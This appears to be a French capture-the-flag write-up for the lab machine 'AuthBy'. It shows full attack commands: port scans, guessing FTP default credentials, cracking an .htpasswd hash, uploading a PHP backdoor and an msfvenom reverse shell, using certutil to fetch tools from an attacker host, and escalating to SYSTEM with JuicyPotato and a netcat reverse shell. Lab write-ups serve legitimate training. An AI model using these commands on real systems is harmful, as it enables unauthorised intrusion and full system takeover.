# AuthBy

	sudo masscan -p1-65535,U:1-65535 192.168.198.46 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.198.46 -oN nmap.txt
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	21/tcp open ftp zFTPServer 6.0 build 2011-10-17  
	242/tcp open http Apache httpd 2.2.21 ((Win32) PHP/5.3.8)  
	3145/tcp open zftp-admin zFTPServer admin  
	3389/tcp open ssl/ms-wbt-server? 
	
Les connexions en anonyme sont autorisées sur le port 21 : 

	ftp anonymous@192.168.198.46
	ftp> ls
	ftp> exit
	wget -r ftp://192.168.198.46/ --ftp-user anonymous --ftp-password ""

Malheureusement je n'ai aucun droit de lecture et je peux apparemment juste traverser les dossiers. Mais j'ai quand même eu deux autres utilisateurs grâce aux messages de la fin : 

> ...
</br> => ‘192.168.198.46/accounts/backup/acc[Offsec].uac’
</br> ...
</br> => ‘192.168.198.46/accounts/backup/acc[anonymous].uac’  
> ... 
</br> => ‘192.168.198.46/accounts/backup/acc[admin].uac’  
> ...

</br>J'ai directement testé les couples ["Offsec" / "offsec"] et ["admin" / "admin"] et le deuxième a fonctionné. Cette fois on a accès à trois fichiers : "index.php", ".htpasswd" et ".htaccess" 

	ftp ftp://Admin:admin@192.168.198.46 -A
	ftp> mget *
	ftp> exit
	cat .htpasswd

Le fichier .htpasswd contient bien les identifiants du troisième compte mais le mot de passe est haché :

	cat .htpasswd | cut -d":" -f2 > hash.txt
	hashid -m hash.txt
	hashcat -m 1600 -a 0 hash.txt ~/wordlists/rockyou.txt
	

J'obtiens le mot de passe en clair mais impossible de se connecter en tant qu'Offsec sur le port 21. En revanche les credentials fonctionnent pour le petit site du port 242 qui demandait directement un identifiant et un mot de passe à l'ouverture. Mais on retombe juste sur la page "index.php" trouvée plus haut qui ne contient qu'une citation en latin. 

Après être retourné sur le FTP avec le deuxième compte, j'ai vu que l'on pouvait uploader des fichiers, j'ai décidé de tenter de mettre une backdoor PHP au même niveau que la page en latin. Cela a fonctionné mais j'ai eu beaucoup de mal à convertir la backdoor en reverse-shell, j'ai donc ensuite directement uploadé un reverse-shell dans le site web : 

	ftp ftp://Admin:admin@192.168.198.46 -A
	ftp> put backdoor.php
	ftp> exit
	curl http://192.168.198.46:242/backdoor.php?cmd=whoami -u offsec
	
	msfvenom  -p php/reverse_php LHOST=192.168.45.236 LPORT=443 -f raw > rev.php
	ftp ftp://Admin:admin@192.168.198.46 -A
	ftp> put rev.php
	ftp> exit
	rlwrap nc -nvlp 443
	curl http://192.168.198.46:242/rev.php
	...
	type C:\Users\apache\Desktop\local.txt


### Élévation de privilèges : 

	whoami /priv

Il y a le "SeImpersonatePrivilege" qui m'a directement poussé vers JuicyPotato et PrintSpoofer, mais pas moyen de les faire marcher, quelque soit l'architecture. La réponse était systématiquement "[...] is not compatible with the version of Windows you're running [...]"

En regardant les caractéristiques de la machine avec "systeminfo" on voit que l'OS est un Windows Server 2008 Standard, ce qui explique ces problèmes de compatibilité. J'ai trouvé une vieille version x86 de JuicyPotato et elle a fonctionné. 
</br>En revanche il faut changer le CLSID. 
</br>Voir https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise et tester un peu toute la liste.

	certutil.exe -urlcache -f http://192.168.45.236/Juicy.Potato.x86.exe ./Juicy.Potato.x86.exe
	certutil.exe -urlcache -f http://192.168.45.236/nc.exe ./nc.exe
	C:\wamp\www\Juicy.Potato.x86.exe -l 9999 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc.exe 192.168.45.236 443 -e cmd.exe" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
	...
	rlwrap nc -nvlp 443
	type C:\Users\Administrator\Desktop\proof.txt




